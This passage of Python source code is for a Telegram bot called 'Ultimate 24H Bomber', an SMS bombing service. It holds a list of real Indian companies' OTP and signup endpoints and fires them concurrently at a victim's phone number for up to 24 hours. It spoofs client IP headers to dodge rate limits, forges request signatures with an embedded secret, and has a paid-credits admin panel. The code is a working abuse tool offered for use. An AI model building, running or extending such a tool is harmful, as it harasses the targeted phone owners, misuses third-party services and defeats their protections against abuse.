    E.append({"name":"EasyMyTrip_Register","method":"POST","url":"https://mybookings.easemytrip.com/MyBooking/RegisterNewUser/","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"emailph":"{t}"}'})
    E.append({"name":"PizzaHut_OTP","method":"POST","url":"https://api.pizzahut.io/v1/otp/generate","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"+91{t}"}'})
    E.append({"name":"Dineout_Signup","method":"POST","url":"https://www.dineout.co.in/xhrajaxrequest/user_signup","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"name=&email=&phone={t}"})
    E.append({"name":"AngelBroking_Form","method":"POST","url":"https://www.angelbroking.com/form-gateways/oda-form.php","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"name=&mobile={t}&city=pune"})
    E.append({"name":"Hungama_OTP","method":"POST","url":"https://communication.api.hungama.com/v1/communication/otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileNo":"{t}","countryCode":"+91","appCode":"un"}'})
    E.append({"name":"MeruCab_OTP","method":"POST","url":"https://merucabapp.com/api/otp/generate","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"mobile_number={t}"})
    E.append({"name":"Dayco_Ekyc","method":"POST","url":"https://ekyc.daycoindia.com/api/nscript_functions.php","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"api=send_otp&mob={t}"})
    E.append({"name":"NoBroker_v3","method":"POST","url":"https://www.nobroker.in/api/v3/account/otp/send","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"phone={t}&countryCode=IN"})
    E.append({"name":"ShipRocket_v1","method":"POST","url":"https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileNumber":"{t}"}'})
    E.append({"name":"PenPencil_OTP","method":"POST","url":"https://api.penpencil.co/v1/users/resend-otp?smsType=1","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{t}"}'})
    E.append({"name":"Servetel_OTP","method":"POST","url":"https://api.servetel.in/v1/auth/otp","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"mobile_number={t}"})
    E.append({"name":"Doubtnut_v4","method":"POST","url":"https://api.doubtnut.com/v4/student/login","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone_number":"{t}","language":"en"}'})
    E.append({"name":"GoPinkCabs","method":"POST","url":"https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"check_mobile_number=1&contact={t}"})
    E.append({"name":"Flipkart_2Rome","method":"POST","url":"https://2.rome.api.flipkart.com/api/4/user/otp/generate","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileNumber":"{t}"}'})
    E.append({"name":"ASVM_Faizabad","method":"POST","url":"http://asvmfaizabad.org/register.php","headers":{"Content-Type":"application/x-www-form-urlencoded","Origin":"http://asvmfaizabad.org","User-Agent":UA_C2},"data":"sname=Tsunami&sclass=XII&sphone={t}&spassword=tsunamiastronomia&ssection=A&submit="})

    return E

ENDPOINTS = build_endpoints()


# ================== HTTP SESSION ==================
async def get_http_session() -> aiohttp.ClientSession:
    global _http_session
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(limit=500, limit_per_host=100, ssl=False)
        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        _http_session = aiohttp.ClientSession(connector=connector, timeout=timeout)
    return _http_session


async def fire_endpoint(ep: dict, target: str) -> bool:
    url = ep["url"].replace("{t}", target)
    ts = str(int(time.time() * 1000))
    u_id = uuid.uuid4().hex
    url = url.replace("{timestamp}", ts).replace("{uuid}", u_id)

    spoof = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    headers = {k: v.replace("{t}", target).replace("{timestamp}", ts).replace("{uuid}", u_id) for k, v in ep["headers"].items()}
    headers["X-Forwarded-For"] = spoof
    headers["Client-IP"] = spoof
    headers["X-Request-Id"] = uuid.uuid4().hex

    data = ep["data"]
    if isinstance(data, str):
        data = data.replace("{t}", target).replace("{timestamp}", ts).replace("{uuid}", u_id)

    if ep.get("hmac"):
        secret = bytes.fromhex("4174697368204167726177616c20436f756e7472792044656c69676874")
        msg = f"{ts}|{target}|SMS".encode('utf-8')
        sig = base64.b64encode(hmac.new(secret, msg, hashlib.sha256).digest()).decode('utf-8')
        headers["X-Timestamp"] = ts
        headers["X-Signature"] = sig

    if ep.get("special_sig"):
        random_bytes = os.urandom(32)
        sig = base64.b64encode(random_bytes).decode('utf-8')
        headers["x-timestamp"] = ts
        headers["x-signature"] = sig

    try:
        session = await get_http_session()
        async with session.request(method=ep["method"], url=url, headers=headers, data=data if data else None, ssl=False) as resp:
            await resp.read()
            return resp.status in (200, 201, 202)
    except Exception:
        return False


async def _fire_batch(batch, target):
    tasks = [fire_endpoint(ep, target) for ep in batch]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return sum(1 for r in results if r is True)


# ================== ADMIN PANEL ==================
async def admin_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid != ADMIN_ID:
        return await update.message.reply_text("? You are not authorized.")
    
    keyboard = [
        [InlineKeyboardButton("SEND SMS", callback_data="admin_sms"), InlineKeyboardButton("MANAGE FIREBASE", callback_data="admin_firebase")],
        [InlineKeyboardButton("MANAGE VIDEOS", callback_data="admin_videos"), InlineKeyboardButton("MANAGE SUPER ADMINS", callback_data="admin_superadmins")],
        [InlineKeyboardButton("MANAGE ADMINS", callback_data="admin_admins"), InlineKeyboardButton("VIEW USERS", callback_data="admin_users")],
        [InlineKeyboardButton("BAN USER", callback_data="admin_ban"), InlineKeyboardButton("UNBAN USER", callback_data="admin_unban")],
        [InlineKeyboardButton("BROADCAST", callback_data="admin_broadcast"), InlineKeyboardButton("API STATS", callback_data="admin_stats")],
        [InlineKeyboardButton("ACTIVITI LOG", callback_data="admin_log"), InlineKeyboardButton("PRICING PLANS", callback_data="admin_pricing")],
        [InlineKeyboardButton("REDEEM CODES", callback_data="admin_redeem"), InlineKeyboardButton("ADD CREDITS", callback_data="admin_addcredits")],
        [InlineKeyboardButton("DEDUCT CREDITS", callback_data="admin_deductcredits"), InlineKeyboardButton("ADD CREDITS ALL", callback_data="admin_addall")],
        [InlineKeyboardButton("DEDUCT ALL", callback_data="admin_deductall"), InlineKeyboardButton("FORCE JOIN", callback_data="admin_forcejoin")],
        [InlineKeyboardButton("SETTINGS", callback_data="admin_settings"), InlineKeyboardButton("SMS HISTORY", callback_data="admin_history")],
        [InlineKeyboardButton("EXPORT SCRIPT", callback_data="admin_export"), InlineKeyboardButton("PROTECT NUMBER", callback_data="admin_protect")],
        [InlineKeyboardButton("PROTECTED LIST", callback_data="admin_protectedlist"), InlineKeyboardButton("TRACK NUMBER", callback_data="admin_track")],
        [InlineKeyboardButton("?? DISABLE FREE MODE", callback_data="admin_freemode")],
        [InlineKeyboardButton("REFRESH", callback_data="admin_refresh")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("?? **ADMIN CONTROL PANEL** ??", reply_markup=reply_markup, parse_mode="Markdown")


# ================== HANDLERS ==================
async def start_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("?? START ULTIMATE BOMBER ??", callback_data="start_bomb")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    text = "?? **ULTIMATE 24H BOMBER** ??\n\nAll APIs loaded. Click below to begin."
    await update.message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")


async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id

    if query.data == "start_bomb":
        user_sessions[uid] = {"state": "awaiting_target", "running": False}
        await query.message.edit_text("?? Send target number (10 digits, no +91):")

    elif query.data == "stop_bomb":
        s = user_sessions.get(uid)
        if s and s.get("running"):
            s["running"] = False
            s["cancelled"] = True
            await query.message.edit_text("?? **STOPPING...**", parse_mode="Markdown")
            
    elif query.data.startswith("admin_"):
        if uid != ADMIN_ID:
            return await query.answer("? Unauthorized Access!", show_alert=True)
            
        action = query.data.replace("admin_", "")
        if action == "refresh":
            await query.answer("? Panel Refreshed!", show_alert=True)
        elif action == "stats":
            await query.answer(f"?? Total APIs: {len(ENDPOINTS)}\n?? Users: {len(user_sessions)}", show_alert=True)
        elif action == "users":
            await query.answer(f"?? Total Users: {len(user_sessions)}", show_alert=True)
        else:
            await query.answer(f"?? '{action.upper()}' feature requires Database.", show_alert=True)


async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = update.message.text.strip()
    s = user_sessions.get(uid)

    if not s or s.get("state") != "awaiting_target":
        return

    if not is_valid_target(text):
        await update.message.reply_text("? Invalid. 10 digits starting with 6/7/8/9.")
        return

    s.update(target=text, state="running", running=True, cancelled=False, timeout=False, sent=0, round=0, started_at=time.time())

    keyboard = [[InlineKeyboardButton("?? STOP BOMBING", callback_data="stop_bomb")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        f"?? **ULTIMATE BOMBER ACTIVATED** ??\n\n"
        f"?? Target: `{text}`\n"
        f"? Speed: MAXIMUM\n"
        f"?? Total APIs: {len(ENDPOINTS)}\n"
        f"?? **DESTRUCTION STARTED!**",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

    asyncio.create_task(run_bombing(uid, s))


# ================== BOMBING LOGIC (24H UNLIMITED) ==================
async def run_bombing(uid: int, s: dict):
    target = s["target"]
    sent = 0
    start = time.time()
    idx = 0
    last_report = start

    try:
        while s.get("running"):
            # 24-Hour limit check
            if time.time() - start >= MAX_DURATION:
                s["timeout"] = True
                break

            s["round"] += 1
            batch = []
            for _ in range(CONCURRENCY):
                batch.append(ENDPOINTS[idx % len(ENDPOINTS)])
                idx += 1

            ok = await _fire_batch(batch, target)
            sent += ok
            s["sent"] = sent

            # Live Progress every 15 seconds
            now = time.time()
            if now - last_report >= 15:
                last_report = now
                try:
                    await telegram_app.bot.send_message(
                        uid,
                        f"?? **Live Update**\n"
                        f"?? Target: `{target}`\n"
                        f"?? Sent: *{sent}*\n"
                        f"? Speed: *{int(sent/(now-start))} SMS/sec*\n"
                        f"? Time: {int(now-start)//60}m {int(now-start)%60}s / 24h",
                        parse_mode="Markdown"
                    )
                except Exception:
                    pass

            if DELAY > 0:
                await asyncio.sleep(DELAY)
            else:
                await asyncio.sleep(0.01)

    except Exception as e:
        logger.exception(f"Bombing error: {e}")
    finally:
        s["running"] = False

    try:
        elapsed = int(time.time() - start)
        speed = int(sent / elapsed) if elapsed > 0 else 0
        
        if s.get("cancelled"):
            reason = "?? **Stopped by you**"
        elif s.get("timeout"):
            reason = "? **24-Hour limit reached**"
        else:
            reason = "? **Finished**"
            
        await telegram_app.bot.send_message(
            uid, 
            f"{reason}!\n\n"
            f"?? Target: `{target}`\n"
            f"?? Total Sent: *{sent}*\n"
            f"? Speed: *{speed} SMS/sec*\n"
            f"? Time: {elapsed//3600}h {(elapsed%3600)//60}m {elapsed%60}s",
            parse_mode="Markdown"
        )
    except Exception:
        pass


# ================== WEBHOOK & STARLETTE ==================
async def health(request):
    return PlainTextResponse("OK", status_code=200)


async def root(request):
    return PlainTextResponse("Ultimate 24H Bomber Live ??")


async def startup():
    global telegram_app
    if not WEBHOOK_URL:
        logger.warning("RENDER_EXTERNAL_URL not set")
        return
    webhook_path = f"/webhook/{BOT_TOKEN}"
    full_url = f"{WEBHOOK_URL}{webhook_path}"

    telegram_app = Application.builder().token(BOT_TOKEN).updater(None).build()
    
    telegram_app.add_handler(CommandHandler("start", start_cmd))
    telegram_app.add_handler(CommandHandler("admin", admin_cmd))
    telegram_app.add_handler(CallbackQueryHandler(button_handler))
    telegram_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))

    await telegram_app.initialize()
    await telegram_app.bot.set_webhook(url=full_url, allowed_updates=Update.ALL_TYPES)
    await telegram_app.start()
    logger.info(f"? Webhook set: {full_url}")


async def webhook(request):
    if telegram_app is None:
        return Response("not ready", status_code=503)
    try:
        data = await request.json()
        update = Update.de_json(data, telegram_app.bot)
        await telegram_app.process_update(update)
    except Exception as e:
        logger.exception(f"webhook error: {e}")
    return Response("ok")


async def shutdown():
    global _http_session, telegram_app
    if _http_session and not _http_session.closed:
        await _http_session.close()
    if telegram_app:
        await telegram_app.stop()
        await telegram_app.shutdown()


def create_app() -> Starlette:
    routes = [
        Route("/", root),
        Route("/health", health),
        Route(f"/webhook/{BOT_TOKEN}", webhook, methods=["POST"]),
    ]
    return Starlette(routes=routes, on_startup=[startup], on_shutdown=[shutdown])


app = create_app()

if __name__ == "__main__":
    if not BOT_TOKEN:
        sys.exit("? BOT_TOKEN missing")
    uvicorn.run(app, host="0.0.0.0", port=PORT, log_level="info")
